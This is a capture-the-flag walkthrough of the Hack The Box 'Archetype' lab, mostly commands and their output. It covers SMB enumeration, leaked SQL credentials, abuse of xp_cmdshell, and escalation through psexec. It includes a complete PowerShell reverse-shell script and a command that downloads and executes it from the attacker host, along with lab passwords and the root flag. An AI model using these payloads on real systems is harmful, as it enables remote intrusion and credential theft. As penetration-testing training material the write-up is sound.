HTB - Archetype

1. Scan with `nmap`:
	```
	kali@kali:~$ nmap -T4 -A -p- 10.10.10.27 
	Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-03 17:58 EDT
	Nmap scan report for 10.10.10.27
	Host is up (0.042s latency).
	Not shown: 65480 closed ports, 43 filtered ports
	PORT      STATE SERVICE      VERSION
	135/tcp   open  msrpc        Microsoft Windows RPC
	139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
	445/tcp   open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds
	1433/tcp  open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM
	| ms-sql-ntlm-info: 
	|   Target_Name: ARCHETYPE
	|   NetBIOS_Domain_Name: ARCHETYPE
	|   NetBIOS_Computer_Name: ARCHETYPE
	|   DNS_Domain_Name: Archetype
	|   DNS_Computer_Name: Archetype
	|_  Product_Version: 10.0.17763
	| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
	| Not valid before: 2020-05-03T17:16:49
	|_Not valid after:  2050-05-03T17:16:49
	|_ssl-date: 2020-05-03T22:15:41+00:00; +14m18s from scanner time.
	5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
	|_http-server-header: Microsoft-HTTPAPI/2.0
	|_http-title: Not Found
	47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
	|_http-server-header: Microsoft-HTTPAPI/2.0
	|_http-title: Not Found
	49664/tcp open  msrpc        Microsoft Windows RPC
	49665/tcp open  msrpc        Microsoft Windows RPC
	49666/tcp open  msrpc        Microsoft Windows RPC
	49667/tcp open  msrpc        Microsoft Windows RPC
	49668/tcp open  msrpc        Microsoft Windows RPC
	49669/tcp open  msrpc        Microsoft Windows RPC
	Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
	
	Host script results:
	|_clock-skew: mean: 1h38m18s, deviation: 3h07m51s, median: 14m17s
	| ms-sql-info: 
	|   10.10.10.27:1433: 
	|     Version: 
	|       name: Microsoft SQL Server 2017 RTM
	|       number: 14.00.1000.00
	|       Product: Microsoft SQL Server 2017
	|       Service pack level: RTM
	|       Post-SP patches applied: false
	|_    TCP port: 1433
	| smb-os-discovery: 
	|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)
	|   Computer name: Archetype
	|   NetBIOS computer name: ARCHETYPE\x00
	|   Workgroup: WORKGROUP\x00
	|_  System time: 2020-05-03T15:15:32-07:00
	| smb-security-mode: 
	|   account_used: guest
	|   authentication_level: user
	|   challenge_response: supported
	|_  message_signing: disabled (dangerous, but default)
	| smb2-security-mode: 
	|   2.02: 
	|_    Message signing enabled but not required
	| smb2-time: 
	|   date: 2020-05-03T22:15:33
	|_  start_date: N/A
	
	Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
	Nmap done: 1 IP address (1 host up) scanned in 187.16 seconds
	```
2. Nessus scan for fun
	Start with `sudo /etc/init.d/nessusd start` and go to `https://kali:8834`

3. Samba is open so lets see is anonymous login enabled and list the shares
	```
	smbclient -L \\\\10.10.10.27\\
	anonymous (or use -N in above command for anonymous login)
	```
	Result: `backups` directory found
	
	See inside `backups`: `smbclient -N \\\\10.10.10.27\\backups`. There is a dtsConfig file, which is a config file used with SSIS: 
	```
	get prod.dtsConfig
	exit
	cat pro.dtsConfig
	```
	
	```
	ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
	```
	
	Result: Contains credientials for user `ARCHETYPE\sql_svc` with password `M3g4c0rp123`.
4. Target is running `Microsoft SQL Server 2017 14.00.1000.00` per the `nmap` scan. Searching for exploit reveals [Rapid 7](https://www.rapid7.com/db/modules/exploit/windows/mssql/mssql_payload) and [HackTricks Book](https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server)
	* HackTricks had command to gather info about the service: `nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=ARCHETYPE\sql_svc,mssql.password=M3g4c0rp123,mssql.instance-name=ARCHETYPE -sV -p 1433 10.10.10.27` which was not helpful since it is similar to the `-A` flag. 
	* Attempt Metasploit exploit:
		```
		sudo msfconsole
		search mssql
		use exploit/windows/mssql/mssql_payload
		options
		set username sql_svc
		set password M3g4c0rp123
		set rhosts 10.10.10.27
		set USE_WINDOWS_AUTHENT true
		set payload windows/meterpreter/reverse_tcp
		options
		run
		```
		Possibly could use `set payload windows/shell_reverse_tcp`
		Failed.
	* Manual Exploit
		* Let's try connecting to the SQL Server using Impacket's mssqlclient.py: `python3 mssqlclient.py ARCHETYPE/sql_svc@10.10.10.27 -win`dows-auth`
		* We can use the `IS_SRVROLEMEMBER` function to reveal whether the current SQL user has sysadmin (highest level) privileges on the SQL Server. This is successful, and we do indeed have sysadmin privileges. This will allow us to enable xp_cmdshell and gain RCE on the host. Let's attempt this, by inputting the commands below.
			```
			EXEC sp_configure 'Show Advanced Options', 1;
			reconfigure;
			sp_configure;
			EXEC sp_configure 'xp_cmdshell', 1
			reconfigure;
			xp_cmdshell "whoami" 
			```
		* Save following as `shell.ps1`: `kali@kali:~$ cat shell.ps1 
 $client = New-Object System.Net.Sockets.TCPClient("10.10.15.117",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close() `
		* Next, stand up a mini webserver in order to host the file. We can use Python: `python3 -m http.server 80`
		* After standing up a netcat listener on port 443: `nc -lvnp 443`
		* We can now issue the command to download and execute the reverse shell through xp_cmdshell: `xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.15.117/shell.ps1\");" `
		* A shell is received as sql_svc, and we can get the user.txt on their desktop.
5. Privilege Escalation
	* As this is a normal user account as well as a service account, it is worth checking for frequently access files or executed commands. We can use the command below to access the PowerShell history file: `type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`
		Result: `net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!`
	* This reveals that the backups drive has been mapped using the local administrator credentials. We can use Impacket's psexec.py to gain a privileged shell.
		```
		kali@kali:~/Downloads/impacket-0.9.21/examples$ python3 psexec.py administrator@10.10.10.27
		Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation
		
		Password: MEGACORP_4dm1n!!
		[*] Requesting shares on 10.10.10.27.....
		[*] Found writable share ADMIN$
		[*] Uploading file tHaoJdVi.exe
		[*] Opening SVCManager on 10.10.10.27.....
		[*] Creating service JESk on 10.10.10.27.....
		[*] Starting service JESk.....
		[!] Press help for extra shell commands
		Microsoft Windows [Version 10.0.17763.107]
		(c) 2018 Microsoft Corporation. All rights reserved.
		
		C:\Windows\system32>whoami
		nt authority\system

		```
	* Get flag
		```
		cd C:\Users\Administrator\Desktop
		type root.txt
		b91ccec3305e98240082d4474b848528
		```


